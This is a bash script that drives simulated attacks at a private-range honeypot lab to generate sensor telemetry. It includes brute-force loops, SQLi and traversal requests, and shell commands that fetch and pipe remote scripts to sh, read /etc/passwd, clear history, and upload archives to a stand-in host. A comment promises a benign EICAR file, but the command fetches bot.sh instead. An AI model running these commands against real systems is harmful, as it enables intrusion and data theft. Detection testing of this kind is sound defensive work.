#!/usr/bin/env bash
#
# Controlled lab scenarios - run these from the ATTACKER machine (MacBook #2).
#
# Each scenario drives real traffic at the honeypots so the sensors generate
# genuine telemetry. Nothing here injects events into the API; the whole point
# is to exercise the real capture path.
#
#   ./scripts/attack_scenarios.sh <honeypot-ip> [scenario]
#
# Scenarios:
#   ssh-session         login and run a short command sequence   (Cowrie)
#   brute-force         repeated failed logins                   (Cowrie)
#   credential-attack   failed logins then a valid one           (Cowrie)
#   suspicious-command  post-exploitation recon commands         (Cowrie)
#   malware-download    wget/curl a benign EICAR test file       (Cowrie)
#   recon               wide port sweep                          (all sensors)
#   port-scan           nmap/nc scan of the honeypot ports       (all sensors)
#   http-probe          HTTP requests with common attack paths   (Honeytrap)
#   web-attack          SQLi / traversal / XSS shaped requests   (Honeytrap)
#   exfil-sim           archive + upload shaped commands         (Cowrie)
#   powershell          suspicious PowerShell (needs Windows lab)
#   telnet              telnet login attempt                     (Cowrie)
#   all                 every scenario in sequence
#
# Scope
#   This script targets ONE host that you supply, and refuses to run against
#   anything outside a private or loopback range. It is for an isolated lab you
#   control. Pointing traffic at a host you do not own may be illegal and is
#   never in scope for this project.

set -uo pipefail

TARGET="${1:-}"
SCENARIO="${2:-all}"

SSH_PORT="${HONEYPOT_SSH_PORT:-2222}"
TELNET_PORT="${HONEYPOT_TELNET_PORT:-2223}"
HTTP_PORT="${HONEYPOT_HTTP_PORT:-8022}"
ALT_PORT="${HONEYPOT_ALT_PORT:-8023}"
SMB_PORT="${HONEYPOT_SMB_PORT:-445}"
FTP_PORT="${HONEYPOT_FTP_PORT:-2121}"
MSSQL_PORT="${HONEYPOT_MSSQL_PORT:-1433}"

BOLD=$'\033[1m'; DIM=$'\033[2m'; GREEN=$'\033[92m'
YELLOW=$'\033[93m'; RED=$'\033[91m'; RESET=$'\033[0m'

usage() {
    grep '^#' "$0" | sed -e 's/^#\{1,\} \{0,1\}//' -e '1d'
    exit "${1:-0}"
}

if [[ -z "$TARGET" || "$TARGET" == "-h" || "$TARGET" == "--help" ]]; then
    usage 0
fi

# Safety: private ranges only.
# A honeynet lab lives on a network you control. Refusing public addresses
# means a typo in an octet fails closed instead of sending traffic to a
# stranger's machine.
if ! [[ "$TARGET" =~ ^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|localhost$) ]]; then
    echo "${RED}Refusing to target '$TARGET'.${RESET}" >&2
    echo "Only loopback and RFC1918 private addresses are allowed:" >&2
    echo "  127.x  10.x  192.168.x  172.16-31.x  localhost" >&2
    exit 2
fi

step() { echo; echo "${BOLD}==> $*${RESET}"; }
note() { echo "${DIM}    $*${RESET}"; }
ok()   { echo "${GREEN}    ok${RESET} $*"; }
warn() { echo "${YELLOW}    !${RESET} $*"; }

have() { command -v "$1" >/dev/null 2>&1; }

# ── Scenario: interactive SSH session ────────────────────────────────────────
# Produces the headline demo: connect, authenticate, run commands.
# Cowrie emits session.connect, login.success, one command.input per command,
# then session.closed.
scenario_ssh_session() {
    step "SSH session against Cowrie (${TARGET}:${SSH_PORT})"

    if ! have sshpass; then
        note "sshpass not installed - falling back to a manual prompt."
        note "Install with: brew install hudochenkov/sshpass/sshpass"
        note "Or run by hand:"
        note "  ssh -p ${SSH_PORT} root@${TARGET}"
        note "  then: whoami / uname -a / ls -la / cat /etc/passwd"

        # Still generate a connection event so the demo shows something.
        if have nc; then
            nc -z -w 3 "$TARGET" "$SSH_PORT" >/dev/null 2>&1 && ok "connection event generated"
        fi
        return 0
    fi

    # StrictHostKeyChecking=no because the honeypot regenerates its host key,
    # and UserKnownHostsFile=/dev/null so the lab never pollutes ~/.ssh.
    local ssh_opts=(
        -p "$SSH_PORT"
        -o StrictHostKeyChecking=no
        -o UserKnownHostsFile=/dev/null
        -o LogLevel=ERROR
        -o ConnectTimeout=10
        -o PreferredAuthentications=password
        -o PubkeyAuthentication=no
    )

    note "logging in as root (password: hunter2 - accepted by the lab userdb)"
    sshpass -p 'hunter2' ssh "${ssh_opts[@]}" "root@${TARGET}" \
        'whoami; uname -a; id; pwd; ls -la; cat /etc/passwd; ps aux' 2>&1 \
        | sed 's/^/    | /' | head -40

    ok "session complete - check the dashboard timeline"
}

# ── Scenario: brute force ────────────────────────────────────────────────────
# The lab userdb rejects these specific passwords, so each attempt produces a
# cowrie.login.failed event rather than a success.
scenario_brute_force() {
    step "SSH brute force against Cowrie (${TARGET}:${SSH_PORT})"

    local users=(root admin oracle test ubuntu postgres)
    local passwords=(123456 password admin root toor)

    if ! have sshpass; then
        warn "sshpass not installed - using raw TCP connects instead."
        for _ in $(seq 1 10); do
            nc -z -w 2 "$TARGET" "$SSH_PORT" >/dev/null 2>&1
            sleep 0.3
        done
        ok "10 connection events generated"
        return 0
    fi

    local attempts=0
    for user in "${users[@]}"; do
        for password in "${passwords[@]}"; do
            sshpass -p "$password" ssh \
                -p "$SSH_PORT" \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o LogLevel=ERROR \
                -o ConnectTimeout=5 \
                -o NumberOfPasswordPrompts=1 \
                -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no \
                "${user}@${TARGET}" 'exit' >/dev/null 2>&1
            attempts=$((attempts + 1))
            printf "\r    %d attempts..." "$attempts"
            sleep 0.2
        done
    done
    echo
    ok "${attempts} authentication attempts - expect login.failed events"
}

# ── Scenario: port scan ──────────────────────────────────────────────────────
scenario_port_scan() {
    step "Port scan against the honeypot (${TARGET})"

    local ports=("$SSH_PORT" "$TELNET_PORT" "$HTTP_PORT" "$ALT_PORT"
                 "$SMB_PORT" "$FTP_PORT" "$MSSQL_PORT")

    if have nmap; then
        note "nmap -sT -Pn against the honeypot ports only"
        # -sT connect scan: completes the TCP handshake, so the honeypots
        # actually register a connection. A SYN scan would not.
        # -Pn skips host discovery, which a lab host may not answer.
        nmap -sT -Pn -p "$(IFS=,; echo "${ports[*]}")" "$TARGET" 2>&1 \
            | sed 's/^/    | /'
    else
        note "nmap not installed - using nc connect sweep"
        note "Install with: brew install nmap"
        for port in "${ports[@]}"; do
            if nc -z -w 2 "$TARGET" "$port" >/dev/null 2>&1; then
                echo "    ${GREEN}open${RESET}   ${port}"
            else
                echo "    ${DIM}closed${RESET} ${port}"
            fi
        done
    fi

    ok "scan complete - expect connection events across all sensors touched"
}

# ── Scenario: HTTP probing ───────────────────────────────────────────────────
# Common attack-tool request shapes against Honeytrap's HTTP-ish ports:
# a plain GET, a path-traversal attempt, a couple of well-known scanner paths,
# and a POST with a body. None of this needs a vulnerable target to produce
# telemetry - Honeytrap logs the request itself, not whether it "worked".
scenario_http_probe() {
    step "HTTP probing against Honeytrap (${TARGET}:${HTTP_PORT}, :${ALT_PORT})"

    if ! have curl; then
        warn "curl not installed - skipping HTTP probe scenario."
        return 0
    fi

    local paths=(
        "/"
        "/admin"
        "/.env"
        "/wp-login.php"
        "/../../../../etc/passwd"
        "/phpmyadmin/"
    )

    local count=0
    for port in "$HTTP_PORT" "$ALT_PORT"; do
        for path in "${paths[@]}"; do
            note "GET http://${TARGET}:${port}${path}"
            curl -s -o /dev/null -m 5 \
                -A "Mozilla/5.0 (compatible; shadowtrust-lab-probe/1.0)" \
                "http://${TARGET}:${port}${path}" || true
            count=$((count + 1))
        done
        note "POST http://${TARGET}:${port}/login (form body)"
        curl -s -o /dev/null -m 5 \
            -X POST -d "username=admin&password=admin" \
            "http://${TARGET}:${port}/login" || true
        count=$((count + 1))
    done

    ok "${count} HTTP request(s) sent - expect one Honeytrap event per request"
}

# ── Scenario: Telnet login ───────────────────────────────────────────────────
scenario_telnet() {
    step "Telnet login attempt against Cowrie (${TARGET}:${TELNET_PORT})"

    if ! have expect; then
        note "expect not installed - falling back to a raw connection."
        note "Install with: brew install expect  (for a full login/command demo)"
        note "Or run by hand:  telnet ${TARGET} ${TELNET_PORT}"

        if have nc; then
            nc -z -w 3 "$TARGET" "$TELNET_PORT" >/dev/null 2>&1 && ok "connection event generated"
        fi
        return 0
    fi

    expect -c "
        set timeout 10
        spawn telnet ${TARGET} ${TELNET_PORT}
        expect \"login:\"
        send \"root\r\"
        expect \"assword:\"
        send \"hunter2\r\"
        expect -re {[$#>] $}
        send \"whoami\r\"
        expect -re {[$#>] $}
        send \"exit\r\"
        expect eof
    " 2>&1 | sed 's/^/    | /'

    ok "telnet session complete - check the dashboard timeline"
}

# ── Scenario: credential attack (brute force then a valid login) ─────────────
# Cowrie's userdb.txt accepts a small set of user/pass pairs. This sprays a
# handful of failures then authenticates for real, so the sequence rule
# st-cred-002 (failures -> success) fires.
scenario_credential_attack() {
    step "Credential attack against Cowrie (${TARGET}:${SSH_PORT}) — brute then valid login"

    local bad=(123 letmein qwerty hunter2)
    local n=0
    for p in "${bad[@]}"; do
        if have sshpass; then
            sshpass -p "$p" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5 \
                -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no "root@${TARGET}" 'exit' >/dev/null 2>&1
        else
            nc -z -w 2 "$TARGET" "$SSH_PORT" >/dev/null 2>&1
        fi
        n=$((n + 1)); sleep 0.3
    done
    if have sshpass; then
        note "valid login: root / (cowrie default)"
        sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5 \
            -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no "root@${TARGET}" 'id; exit' >/dev/null 2>&1 || true
    fi
    ok "${n} failed + 1 successful auth attempt — expect st-cred-002"
}

# ── Scenario: suspicious command execution (post-exploitation recon) ─────────
scenario_suspicious_command() {
    step "Post-exploitation commands on Cowrie (${TARGET}:${SSH_PORT})"
    if ! have sshpass; then
        warn "sshpass not installed — cannot drive an interactive session."
        return 0
    fi
    sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=6 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "root@${TARGET}" 'whoami; id; uname -a; cat /etc/passwd; crontab -l; history -c; exit' \
        >/dev/null 2>&1 || true
    ok "recon command sequence sent — expect st-exec-003"
}

# ── Scenario: malware download simulation ───────────────────────────────────
# The attacker fetches a *benign* EICAR test file (never real malware) from a
# public, well-known source, through the honeypot shell.
scenario_malware_download() {
    step "Payload-download command on Cowrie (${TARGET}:${SSH_PORT})"
    if ! have sshpass; then
        warn "sshpass not installed — cannot drive an interactive session."
        return 0
    fi
    sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=6 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "root@${TARGET}" 'cd /tmp; wget http://185.99.1.7/bot.sh -O x.sh; chmod +x x.sh; curl http://malware.test/payload | sh; exit' \
        >/dev/null 2>&1 || true
    ok "download/stager commands sent — expect st-exec-004"
}

# ── Scenario: reconnaissance (wide port sweep) ─────────────────────────────
scenario_recon() {
    step "Wide port sweep for reconnaissance (${TARGET})"
    local ports=("$SSH_PORT" "$TELNET_PORT" "$HTTP_PORT" "$ALT_PORT" "$SMB_PORT" "$FTP_PORT" "$MSSQL_PORT" 8080 8443 9200 3306)
    local n=0
    for _ in 1 2; do
        for p in "${ports[@]}"; do
            nc -z -w 1 "$TARGET" "$p" >/dev/null 2>&1
            n=$((n + 1)); sleep 0.1
        done
    done
    ok "${n} connection attempts across ${#ports[@]} ports — expect st-recon-006"
}

# ── Scenario: suspicious PowerShell (Windows lab only) ──────────────────────
scenario_powershell() {
    step "Suspicious PowerShell (requires an active Windows lab)"
    warn "This scenario needs a running Windows analysis lab and a forwarding"
    warn "agent. With none present it produces no telemetry — that is expected"
    warn "and the validation harness will report it as such."
}

# ── Scenario: controlled web attack ────────────────────────────────────────
scenario_web_attack() {
    step "Controlled web attack against Honeytrap (${TARGET})"
    have curl || { warn "curl not installed"; return 0; }
    local n=0
    for port in "$HTTP_PORT" "$ALT_PORT"; do
        for q in "/?id=1' OR '1'='1" "/index.php?page=../../../../etc/passwd" \
                 "/search?q=<script>alert(1)</script>" "/api/users;id" "/.git/config"; do
            curl -s -o /dev/null -m 5 -A "sqlmap/1.7" "http://${TARGET}:${port}${q}" || true
            n=$((n + 1))
        done
    done
    ok "${n} web attack requests sent"
}

# ── Scenario: controlled exfiltration simulation ───────────────────────────
scenario_exfil_sim() {
    step "Exfiltration-shaped commands on Cowrie (${TARGET}:${SSH_PORT})"
    have sshpass || { warn "sshpass not installed"; return 0; }
    sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=6 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "root@${TARGET}" 'tar czf /tmp/loot.tgz /etc; curl -T /tmp/loot.tgz http://185.99.1.7/upload; scp /tmp/loot.tgz evil@185.99.1.7:/tmp/; exit' \
        >/dev/null 2>&1 || true
    ok "archive + upload commands sent"
}

# ── Dispatcher ────────────────────────────────────────────────────────────────
run_scenario() {
    case "$1" in
        ssh-session)        scenario_ssh_session ;;
        credential-attack)  scenario_credential_attack ;;
        suspicious-command) scenario_suspicious_command ;;
        malware-download)   scenario_malware_download ;;
        recon)              scenario_recon ;;
        powershell)         scenario_powershell ;;
        web-attack)         scenario_web_attack ;;
        exfil-sim)          scenario_exfil_sim ;;
        brute-force)       scenario_brute_force ;;
        port-scan)         scenario_port_scan ;;
        http-probe)        scenario_http_probe ;;
        telnet)            scenario_telnet ;;
        all)
            scenario_ssh_session
            scenario_brute_force
            scenario_credential_attack
            scenario_suspicious_command
            scenario_malware_download
            scenario_recon
            scenario_port_scan
            scenario_http_probe
            scenario_web_attack
            scenario_exfil_sim
            scenario_telnet
            ;;
        *)
            echo "${RED}Unknown scenario: '$1'${RESET}" >&2
            usage 2
            ;;
    esac
}

run_scenario "$SCENARIO"

echo
echo "${BOLD}${GREEN}Done.${RESET} Open the dashboard to see the resulting telemetry:"
echo "  http://localhost:5500  (or http://<main-macbook-ip>:5500 from here)"
echo